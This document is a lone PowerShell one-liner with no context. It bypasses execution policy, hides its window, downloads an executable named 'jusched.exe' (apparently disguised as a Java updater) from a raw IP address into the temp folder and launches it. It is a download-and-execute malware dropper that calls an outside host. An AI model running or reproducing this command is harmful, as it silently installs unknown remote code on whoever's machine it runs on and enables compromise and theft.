
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~rama/jusched.exe', $env:TEMP\jusched.exe );Start-Process ( $env:TEMP\jusched.exe )

